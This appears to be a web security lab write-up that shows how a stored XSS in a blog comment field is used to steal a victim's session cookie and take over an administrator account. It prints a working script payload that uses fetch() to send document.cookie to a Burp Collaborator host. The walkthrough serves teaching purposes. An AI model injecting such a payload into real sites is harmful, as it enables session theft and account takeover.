This is a real usage of XSS to steal cookies.
First, let's see the vulnerable endpoint:

Leaving our payloads in the field we think are vulnerable:
![](imgs/xss_cookie_steal.png)

One of the payloads get rendered:
![](imgs/xss_cookie_steal-1.png)

It is the comment section, as the text on the user name is displayed and the comment is not:
![](imgs/xss_cookie_steal-2.png)

We can create now our payload which basically will perform an HTTP request to our Burp Collaborator server, embedding the cookie as one of the headers:

```javascript
<script> 
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie }); 
</script>
```

Let's set up Burp Collaborator:
![](imgs/xss_cookie_steal-3.png)

Our payload would be:
```javascript
<script> 
fetch('https://h0i6de4wth9eor4zipkzqrgek5qwen2c.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie }); 
</script>
```

![](imgs/xss_cookie_steal-4.png)

The victim will visit this website. If we click on "poll now" in Burp Collaborator, we can see a request from another IP:
![](imgs/xss_cookie_steal-5.png)

Inspecting the HTTP requests leads to this:
![](imgs/xss_cookie_steal-6.png)

Using the `session` cookie leads us to the victim's account:
![](imgs/xss_cookie_steal-7.png)

We can see that we are the administrator user:
![](imgs/xss_cookie_steal-8.png)

Updating the email leads us to solve the lab:
![](imgs/xss_cookie_steal-9.png)

